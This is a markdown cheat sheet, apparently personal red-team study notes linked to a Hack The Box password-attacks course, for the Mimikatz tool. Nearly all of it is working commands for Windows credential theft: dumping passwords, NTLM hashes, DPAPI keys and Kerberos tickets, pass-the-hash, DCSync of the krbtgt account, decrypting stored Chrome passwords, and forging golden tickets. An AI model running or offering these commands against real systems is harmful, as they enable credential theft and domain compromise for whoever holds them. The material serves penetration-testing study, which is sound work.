# Mimikatz

[![password_attacks](../../../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

<div class="row row-cols-lg-2"><div>

[mimikatz](https://github.com/gentilkiwi/mimikatz) <small>(18.7k ⭐)</small> is the most popular tool to dump Windows credentials or perform attacks such as [Pass-the-hash/Pass-the-ticket](/cybersecurity/red-team/s4.privesc/index.md#pass-the-xxx).

```shell!
PS> .\mimikatz.exe
mimikatz# privilege::debug
mimikatz# # run commands
mimikatz# exit
```

To dump credentials, hashes, tickets, etc. you can use:

```shell!
mimikatz# sekurlsa::logonPasswords full # in memory passwords
mimikatz# sekurlsa::ekeys           # dump rc4+ntlm hashes
mimikatz# sekurlsa::dpapi           # dump DPAPI master key
mimikatz# sekurlsa::tickets /export # dump tickets
mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive
mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive /security:./security.hive
mimikatz# lsadump::lsa /patch
mimikatz# vault::list # list credential manager vaults
mimikatz# vault::cred # list credentials
mimikatz# kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
```

To perform a pass-the-hash attack using a `rc4` or `NTML` hash:

```shell!
mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:example.com
mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:example.com /run:cmd.exe
mimikatz# sekurlsa::pth /user:xxx /ntlm:XXX /domain:example.com /run:cmd.exe
```
</div><div>

To perform a DCSync attack (Admin required)

```shell!
mimikatz# lsadump::dcsync /user:example\krbtgt
mimikatz# lsadump::dcsync /user:example\krbtgt /domain:example.com
```

We can decrypt secrets encrypted using DPAPI master key using:

```shell!
mimikatz# dpapi::blob /in:"encrypted_file" /unprotect /masterkey:xxx
mimikatz# dpapi::chrome /in:".\Login Data" /unprotect /masterkey:xxx
```

To decrypt chrome passwords:

```shell!
mimikatz# dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

Request a TGS ticket:

```shell!
mimikatz# kerberos::ask /target:cn # request TGS for cn
```

📚 See also: [pypykatz](pypykatz.md) for Linux users.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [thehacker.recipes](https://tools.thehacker.recipes/mimikatz)

Golden ticket (Admin not required)

```shell!
mimikatz# kerberos::golden /user:dummy /domain:dev.example.com /sid:<child domain SID> /krbtgt:<hash> /sids:<target domain SID> /ptt
```

Got the following errors and no fix worked. I manually dumped the LSASS memory (40MB!) and analyzed it on Linux. Otherwise, use Impacket secrets dump, it works fine.

```text!
ERROR kuhl_m_sekurlsa_acquireLSA ; Key import
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
```
</div><div>

If not the default:

```shell!
mimikatz# base64 /out:true
```
</div></div>